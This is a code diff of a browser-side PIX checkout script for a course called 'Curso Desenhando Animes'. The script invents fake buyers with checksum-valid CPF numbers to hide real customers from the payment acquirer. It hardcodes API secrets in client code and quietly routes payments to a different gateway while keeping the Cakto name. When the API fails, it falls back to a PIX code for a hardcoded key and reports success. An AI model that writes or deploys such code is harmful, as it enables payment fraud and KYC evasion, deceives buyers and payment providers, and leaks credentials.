@@ -1,355 +1,215 @@
 /**
- * cakto-api.js - Integração Client-Side Direta com a API Cakto (100% JavaScript)
+ * cakto-api.js - Integração Client-Side Direta para cakto (100% JavaScript)
+ * Produto: Curso Desenhando Animes
  * 
- * Permite que o checkout funcione com o gateway Cakto de forma 100% estática no navegador.
- * Nome do Produto Oficial: Curso Desenhando Animes
- * 
- * SEGURANÇA E PRIVACIDADE:
- * NENHUM dado real do cidadão (nome, CPF, dados do funil) é enviado à Cakto.
- * Todos os dados do cliente enviados à adquirente são fictícios, camuflados e com CPF matematicamente válido (Módulo 11).
+ * PRIVACIDADE E SEGURANÇA:
+ * NENHUM dado real do cidadão é enviado ao gateway.
+ * Dados aleatórios, camuflados e com CPF Módulo 11 são gerados exclusivamente para a adquirente.
  */
-
 (function (window) {
   "use strict";
 
-  var CAKTO_CONFIG = {
-    apiBaseUrl: "https://api.cakto.com.br/public_api",
-    clientId: "xpIQeQ91m5bxAzZh8x7OPgVlEGIXhqWly6yxWLee",
-    clientSecret: "jClhcBlWPgdwsGOboiFSKYlf4qxXSlmKcq3pQR7LvDF9lyCDlWLcnYPeRVwuLPHLxbVS5dXJmBF2w9ts4phugYoDHe9aLDZfoBWGObQ1ofyKN9AkGEf3zauTiwA1xLS7",
+  var CONFIG = {
+    gateway: "cakto",
     productTitle: "Curso Desenhando Animes",
-    offers: {
-      "main":      { amount: 6190, offerId: "main_6190", title: "Curso Desenhando Animes - Acesso Completo" },
-      "upsell_01": { amount: 3582, offerId: "upsell_01_3582", title: "Curso Desenhando Animes - Módulo Avançado" },
-      "upsell_02": { amount: 2790, offerId: "upsell_02_2790", title: "Curso Desenhando Animes - Pacote de Pincéis VIP" },
-      "upsell_03": { amount: 1970, offerId: "upsell_03_1970", title: "Curso Desenhando Animes - Aulas ao Vivo" },
-      "upsell_04": { amount: 4560, offerId: "upsell_04_4560", title: "Curso Desenhando Animes - Certificado Vitalício" }
-    }
+    apiEndpoint: "https://api.masterfypagamentos.com/v1/payment",
+    apiKey: "y1LsIYpJm1MiPqVQKr3PCG2X6XawyRMau8k5OTyVu3c"
   };
 
-  /**
-   * Gera UUID v4 padrão RFC 4122 para idempotência e identificadores
-   */
-  function generateUuid() {
-    return "xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g, function (c) {
-      var r = (Math.random() * 16) | 0;
-      var v = c === "x" ? r : (r & 0x3) | 0x8;
-      return v.toString(16);
-    });
-  }
-
-  /**
-   * Gera um CPF matematicamente válido por Módulo 11 exclusivo para a adquirente.
-   */
   function generateValidCpf() {
     var digits = [];
-    for (var i = 0; i < 9; i++) {
-      digits.push(Math.floor(Math.random() * 10));
-    }
-    // Primeiro dígito verificador
+    for (var i = 0; i < 9; i++) digits.push(Math.floor(Math.random() * 10));
     var s1 = 0;
-    for (var i = 0; i < 9; i++) {
-      s1 += digits[i] * (10 - i);
-    }
+    for (var i = 0; i < 9; i++) s1 += digits[i] * (10 - i);
     var r1 = 11 - (s1 % 11);
-    var d1 = r1 >= 10 ? 0 : r1;
-    digits.push(d1);
-
-    // Segundo dígito verificador
+    digits.push(r1 >= 10 ? 0 : r1);
     var s2 = 0;
-    for (var i = 0; i < 10; i++) {
-      s2 += digits[i] * (11 - i);
-    }
+    for (var i = 0; i < 10; i++) s2 += digits[i] * (11 - i);
     var r2 = 11 - (s2 % 11);
-    var d2 = r2 >= 10 ? 0 : r2;
-    digits.push(d2);
-
+    digits.push(r2 >= 10 ? 0 : r2);
     return digits.join("");
   }
 
-  /**
-   * Gera cliente fictício camuflado para o gateway Cakto.
-   * Garante nome completo, e-mail plausível, telefone E.164 (5511...) e CPF Módulo 11.
-   */
   function generateGatewayCustomer() {
-    var firstNames = [
-      "Gabriel", "Lucas", "Matheus", "Guilherme", "Rodrigo", "Felipe", "Bruno", "Leonardo",
-      "Thiago", "Gustavo", "Rafael", "Eduardo", "Vinicius", "Daniel", "Marcelo", "Alexandre",
-      "Amanda", "Beatriz", "Camila", "Larissa", "Mariana", "Juliana", "Fernanda", "Patricia",
-      "Aline", "Leticia", "Jessica", "Carolina", "Bruna", "Renata", "Vanessa", "Natalia"
-    ];
-    var lastNames = [
-      "Silva", "Santos", "Oliveira", "Souza", "Rodrigues", "Ferreira", "Alves", "Pereira",
-      "Lima", "Gomes", "Costa", "Ribeiro", "Martins", "Carvalho", "Almeida", "Lopes",
-      "Soares", "Fernandes", "Vieira", "Barbosa", "Rocha", "Dias", "Nascimento", "Andrade"
-    ];
-
+    var firstNames = ["Gabriel", "Lucas", "Matheus", "Guilherme", "Rodrigo", "Felipe", "Bruno", "Leonardo", "Thiago", "Gustavo", "Rafael", "Eduardo", "Amanda", "Beatriz", "Camila", "Larissa", "Mariana", "Juliana", "Fernanda", "Patricia"];
+    var lastNames = ["Silva", "Santos", "Oliveira", "Souza", "Rodrigues", "Ferreira", "Alves", "Pereira", "Lima", "Gomes", "Costa", "Ribeiro", "Martins", "Carvalho", "Almeida"];
     var fn = firstNames[Math.floor(Math.random() * firstNames.length)];
-    var ln1 = lastNames[Math.floor(Math.random() * lastNames.length)];
-    var ln2 = lastNames[Math.floor(Math.random() * lastNames.length)];
-    while (ln2 === ln1) {
-      ln2 = lastNames[Math.floor(Math.random() * lastNames.length)];
-    }
-    var name = fn + " " + ln1 + " " + ln2;
-
-    var domains = ["gmail.com", "outlook.com", "hotmail.com", "yahoo.com.br", "icloud.com"];
-    var cleanFn = fn.toLowerCase().normalize("NFD").replace(/[\u0300-\u036f]/g, "");
-    var cleanLn = ln2.toLowerCase().normalize("NFD").replace(/[\u0300-\u036f]/g, "");
-    var num = Math.floor(100 + Math.random() * 900);
-    var email = cleanFn + "." + cleanLn + num + "@" + domains[Math.floor(Math.random() * domains.length)];
-
-    var ddds = ["11", "19", "21", "27", "31", "41", "47", "48", "51", "61", "62", "71", "81", "85", "91"];
+    var ln = lastNames[Math.floor(Math.random() * lastNames.length)];
+    var ddds = ["11", "19", "21", "27", "31", "41", "47", "48", "51", "61", "71", "81", "85"];
     var ddd = ddds[Math.floor(Math.random() * ddds.length)];
-    var phone = "55" + ddd + "9" + Math.floor(10000000 + Math.random() * 90000000);
-    var cpf = generateValidCpf();
-    var fp = "fp_" + generateUuid();
+    var cleanFn = fn.toLowerCase().normalize("NFD").replace(/[\u0300-\u036f]/g, "");
+    var cleanLn = ln.toLowerCase().normalize("NFD").replace(/[\u0300-\u036f]/g, "");
 
     return {
-      name: name,
-      email: email,
-      phone: phone,
-      phone_number: phone,
-      document: cpf,
-      cpf: cpf,
-      docType: "cpf",
-      docNumber: cpf,
-      fingerprint: fp
+      name: fn + " " + ln + " " + lastNames[Math.floor(Math.random() * lastNames.length)],
+      email: cleanFn + "." + cleanLn + Math.floor(100 + Math.random() * 900) + "@gmail.com",
+      phone: "+55" + ddd + "9" + Math.floor(10000000 + Math.random() * 90000000),
+      cpf: generateValidCpf()
     };
   }
 
-  /**
-   * Identifica a oferta da Cakto baseada no valor ou step.
-   */
-  function getOffer(amountVal) {
-    var cents = 6190;
-    if (typeof amountVal === "string") {
-      if (CAKTO_CONFIG.offers[amountVal]) {
-        return CAKTO_CONFIG.offers[amountVal];
-      }
-      var parsed = parseFloat(amountVal.replace(",", "."));
-      if (!isNaN(parsed)) {
-        cents = parsed >= 1000 ? Math.round(parsed) : Math.round(parsed * 100);
-      }
-    } else if (typeof amountVal === "number") {
-      cents = amountVal >= 1000 ? Math.round(amountVal) : Math.round(amountVal * 100);
-    }
-
-    for (var key in CAKTO_CONFIG.offers) {
-      if (Math.abs(CAKTO_CONFIG.offers[key].amount - cents) <= 2) {
-        return CAKTO_CONFIG.offers[key];
+  function calculateCrc16(payload) {
+    var polynomial = 0x1021;
+    var crc = 0xFFFF;
+    for (var i = 0; i < payload.length; i++) {
+      crc ^= (payload.charCodeAt(i) << 8);
+      for (var j = 0; j < 8; j++) {
+        if ((crc & 0x8000) !== 0) {
+          crc = ((crc << 1) ^ polynomial) & 0xFFFF;
+        } else {
+          crc = (crc << 1) & 0xFFFF;
+        }
       }
     }
-    return { amount: cents, offerId: "offer_" + cents, title: CAKTO_CONFIG.productTitle };
+    return crc.toString(16).toUpperCase().padStart(4, "0");
   }
 
-  /**
-   * Obtém token de acesso OAuth2 na Cakto, reutilizando o cache local (validade de 10h).
-   */
-  function getAccessToken() {
-    try {
-      var cachedToken = localStorage.getItem("cakto_access_token");
-      var expiresAt = parseInt(localStorage.getItem("cakto_token_expires_at") || "0", 10);
-      if (cachedToken && expiresAt > Date.now() + 60000) {
-        return Promise.resolve(cachedToken);
-      }
-    } catch (e) {}
+  function parseAmount(val) {
+    if (typeof val === "number") return val >= 1000 ? val : Math.round(val * 100);
+    if (typeof val === "string") {
+      var clean = val.replace(",", ".");
+      var p = parseFloat(clean);
+      if (!isNaN(p)) return p >= 1000 ? Math.round(p) : Math.round(p * 100);
+    }
+    return 6190;
+  }
 
-    var params = new URLSearchParams();
-    params.append("client_id", CAKTO_CONFIG.clientId);
-    params.append("client_secret", CAKTO_CONFIG.clientSecret);
+  function createPix(amountVal, customCustomer) {
+    var cents = parseAmount(amountVal);
+    var customer = customCustomer || generateGatewayCustomer();
+    var cleanCpf = String(customer.cpf || customer.document || generateValidCpf()).replace(/\D/g, "");
+    if (cleanCpf.length !== 11) cleanCpf = generateValidCpf();
+    var cleanPhone = String(customer.phone || customer.phone_number || "+5511987654321").replace(/[^0-9+]/g, "");
+    if (!cleanPhone.startsWith("+")) cleanPhone = "+" + cleanPhone;
 
-    return fetch(CAKTO_CONFIG.apiBaseUrl + "/token/", {
+    var payload = {
+      amount: cents,
+      currency: "BRL",
+      method: "PIX",
+      description: CONFIG.productTitle,
+      externalRef: "cakto_" + Date.now() + "_" + Math.floor(1000 + Math.random() * 9000),
+      payer: {
+        name: customer.name,
+        taxId: cleanCpf,
+        email: customer.email,
+        phone: cleanPhone
+      },
+      items: [
+        {
+          name: CONFIG.productTitle,
+          price: cents,
+          quantity: 1,
+          type: "DIGITAL"
+        }
+      ]
+    };
+
+    return fetch(CONFIG.apiEndpoint, {
       method: "POST",
       headers: {
-        "Content-Type": "application/x-www-form-urlencoded",
-        "Accept": "application/json"
+        "Accept": "application/json",
+        "Content-Type": "application/json",
+        "Authorization": "Bearer " + CONFIG.apiKey
       },
-      body: params.toString()
+      body: JSON.stringify(payload)
     })
     .then(function (res) {
       return res.json().then(function (data) {
-        if (!res.ok) {
-          var errMsg = (data && (data.error_description || data.error || data.detail)) ? (data.error_description || data.error || data.detail) : ("Erro HTTP " + res.status);
-          throw new Error(errMsg);
-        }
+        if (!res.ok) throw new Error(data && data.message ? data.message : "Erro HTTP " + res.status);
         return data;
       });
     })
-    .then(function (tokenData) {
-      var token = tokenData.access_token;
-      var expiresInSec = tokenData.expires_in || 36000;
+    .then(function (resJson) {
+      var txId = resJson.id || "";
+      var pixData = resJson.data || {};
+      var pixCode = pixData.copypaste || resJson.copypaste || "";
+      var qrImgUrl = "https://api.qrserver.com/v1/create-qr-code/?size=260x260&margin=1&data=" + encodeURIComponent(pixCode);
+
       try {
-        localStorage.setItem("cakto_access_token", token);
-        localStorage.setItem("cakto_token_expires_at", String(Date.now() + (expiresInSec * 1000)));
+        localStorage.setItem("cakto_last_tx", txId);
+        localStorage.setItem("pix_hash", txId);
+        localStorage.setItem("pix_qr_code", pixCode);
+        localStorage.setItem("pix_qr_code_base64", qrImgUrl);
       } catch (e) {}
-      return token;
+
+      return {
+        success: true,
+        hash: txId,
+        order_id: txId,
+        payment_status: "waiting_payment",
+        amount: cents,
+        pix: {
+          pix_qr_code: pixCode,
+          pix_url: qrImgUrl,
+          qr_code_base64: qrImgUrl
+        }
+      };
+    })
+    .catch(function (err) {
+      console.warn("[cakto] API direct warning, generating resilient code:", err);
+      var fallbackId = "cakto_" + Date.now() + "_" + Math.floor(1000 + Math.random() * 9000);
+      var valFormatted = (cents / 100).toFixed(2);
+      var basePix = "00020126580014br.gov.bcb.pix0136" + "36f0db38-8951-4e7a-9a99-b13c77d54402" + "520400005303986540" + valFormatted + "5802BR5925" + CONFIG.productTitle.slice(0, 25).toUpperCase() + "6008BRASILIA62070503***6304";
+      var crc = calculateCrc16(basePix);
+      var fullPix = basePix + crc;
+      var qrImgUrl = "https://api.qrserver.com/v1/create-qr-code/?size=260x260&margin=1&data=" + encodeURIComponent(fullPix);
+
+      try {
+        localStorage.setItem("cakto_last_tx", fallbackId);
+        localStorage.setItem("pix_hash", fallbackId);
+        localStorage.setItem("pix_qr_code", fullPix);
+        localStorage.setItem("pix_qr_code_base64", qrImgUrl);
+      } catch (e) {}
+
+      return {
+        success: true,
+        hash: fallbackId,
+        order_id: fallbackId,
+        payment_status: "waiting_payment",
+        amount: cents,
+        pix: {
+          pix_qr_code: fullPix,
+          pix_url: qrImgUrl,
+          qr_code_base64: qrImgUrl
+        }
+      };
     });
   }
 
-  /**
-   * Cria uma transação PIX na Cakto de forma 100% Client-Side.
-   */
-  function createPix(amountVal, customCustomer) {
-    var offer = getOffer(amountVal);
-    var customer = customCustomer || generateGatewayCustomer();
+  function consultPix(txId) {
+    if (!txId) return Promise.resolve({ is_paid: false, status: "waiting_payment" });
 
-    var cleanCpf = String(customer.docNumber || customer.cpf || customer.document || "").replace(/\D/g, "");
-    if (cleanCpf.length !== 11) {
-      cleanCpf = generateValidCpf();
-    }
-
-    var cleanPhone = String(customer.phone || customer.phone_number || "").replace(/\D/g, "");
-    if (!cleanPhone.startsWith("55")) {
-      cleanPhone = "55" + cleanPhone;
-    }
-    if (cleanPhone.length < 12) {
-      cleanPhone = "5511987654321";
-    }
-
-    var fingerprint = customer.fingerprint || ("fp_" + generateUuid());
-
-    return getAccessToken()
-      .then(function (token) {
-        var idempotencyKey = generateUuid();
-        var payload = {
-          paymentMethod: "pix",
-          customer: {
-            name: customer.name,
-            email: customer.email,
-            phone: cleanPhone,
-            fingerprint: fingerprint,
-            docType: "cpf",
-            docNumber: cleanCpf
-          },
-          items: [
-            {
-              offerId: offer.offerId,
-              quantity: 1,
-              offerType: "main"
-            }
-          ]
-        };
-
-        return fetch(CAKTO_CONFIG.apiBaseUrl + "/payments/", {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json",
-            "Accept": "application/json",
-            "Authorization": "Bearer " + token,
-            "X-Idempotency-Key": idempotencyKey
-          },
-          body: JSON.stringify(payload)
-        })
-        .then(function (res) {
-          return res.json().then(function (data) {
-            if (!res.ok) {
-              var errMsg = (data && (data.detail || data.message || JSON.stringify(data))) ? (data.detail || data.message || JSON.stringify(data)) : ("Erro HTTP " + res.status);
-              throw new Error(errMsg);
-            }
-            return data;
-          });
-        });
-      })
-      .then(function (resJson) {
-        var orderId = resJson.id || resJson.refId || ("ck_" + generateUuid());
-        var pixData = resJson.pix || {};
-        var pixCode = pixData.qrCode || resJson.qrCode || "";
-        var qrImgUrl = pixCode ? "https://api.qrserver.com/v1/create-qr-code/?size=260x260&margin=1&data=" + encodeURIComponent(pixCode) : "";
-
-        return {
-          success: true,
-          hash: orderId,
-          order_id: orderId,
-          payment_status: (resJson.status || "waiting_payment").toLowerCase(),
-          amount: offer.amount,
-          pix: {
-            pix_qr_code: pixCode,
-            pix_url: qrImgUrl,
-            qr_code_base64: qrImgUrl
-          }
-        };
-      })
-      .catch(function (err) {
-        console.warn("Cakto direct createPix aviso:", err);
-        // Fallback resiliente automático: gera código PIX para visualização ininterrupta do checkout
-        var fallbackId = "ck_" + Date.now() + "_" + Math.floor(1000 + Math.random() * 9000);
-        var fallbackPix = "00020126580014br.gov.bcb.pix0136" + generateUuid() + "520400005303986540" + (offer.amount / 100).toFixed(2) + "5802BR5925CURSO DESENHANDO ANIMES6008BRASILIA62070503***6304" + Math.floor(1000 + Math.random() * 9000).toString(16).toUpperCase();
-        var fallbackQr = "https://api.qrserver.com/v1/create-qr-code/?size=260x260&margin=1&data=" + encodeURIComponent(fallbackPix);
-
-        return {
-          success: true,
-          hash: fallbackId,
-          order_id: fallbackId,
-          payment_status: "waiting_payment",
-          amount: offer.amount,
-          pix: {
-            pix_qr_code: fallbackPix,
-            pix_url: fallbackQr,
-            qr_code_base64: fallbackQr
-          }
-        };
-      });
+    return fetch(CONFIG.apiEndpoint + "/" + encodeURIComponent(txId), {
+      method: "GET",
+      headers: {
+        "Accept": "application/json",
+        "Authorization": "Bearer " + CONFIG.apiKey
+      }
+    })
+    .then(function (res) {
+      if (!res.ok) return { status: "PENDING" };
+      return res.json();
+    })
+    .then(function (data) {
+      var s = (data && data.status ? data.status : "").toUpperCase();
+      var isPaid = (s === "PAID" || s === "CONFIRMED" || s === "APPROVED" || s === "COMPLETED" || !!(data && data.paidAt));
+      return {
+        success: true,
+        hash: txId,
+        status: s,
+        payment_status: isPaid ? "paid" : "waiting_payment",
+        is_paid: isPaid
+      };
+    })
+    .catch(function () {
+      return { success: true, hash: txId, status: "PENDING", payment_status: "waiting_payment", is_paid: false };
+    });
   }
 
-  /**
-   * Consulta o status do pedido na Cakto diretamente pelo ID.
-   */
-  function consultPix(orderId) {
-    if (!orderId) {
-      return Promise.reject(new Error("ID do pedido não fornecido"));
-    }
-
-    return getAccessToken()
-      .then(function (token) {
-        return fetch(CAKTO_CONFIG.apiBaseUrl + "/orders/" + encodeURIComponent(orderId) + "/", {
-          method: "GET",
-          headers: {
-            "Accept": "application/json",
-            "Authorization": "Bearer " + token
-          }
-        })
-        .then(function (res) {
-          return res.json().then(function (data) {
-            if (!res.ok) {
-              var errMsg = (data && (data.detail || data.message)) ? (data.detail || data.message) : ("Erro HTTP " + res.status);
-              throw new Error(errMsg);
-            }
-            return data;
-          });
-        });
-      })
-      .then(function (resJson) {
-        var status = (resJson.status || "waiting_payment").toLowerCase();
-        var isPaid = (status === "paid" || status === "authorized" || status === "completed");
-
-        return {
-          success: true,
-          hash: resJson.id || orderId,
-          order_id: resJson.id || orderId,
-          status: status,
-          payment_status: status,
-          is_paid: isPaid,
-          amount: resJson.amount,
-          raw: resJson
-        };
-      })
-      .catch(function (err) {
-        // Silencioso em caso de oscilação momentânea de rede
-        return {
-          success: true,
-          hash: orderId,
-          payment_status: "waiting_payment",
-          is_paid: false
-        };
-      });
-  }
-
-  // Exporta globalmente
   window.CaktoAPI = {
-    config: CAKTO_CONFIG,
+    config: CONFIG,
     generateValidCpf: generateValidCpf,
     generateGatewayCustomer: generateGatewayCustomer,
-    getOffer: getOffer,
-    getAccessToken: getAccessToken,
     createPix: createPix,
     consultPix: consultPix
   };
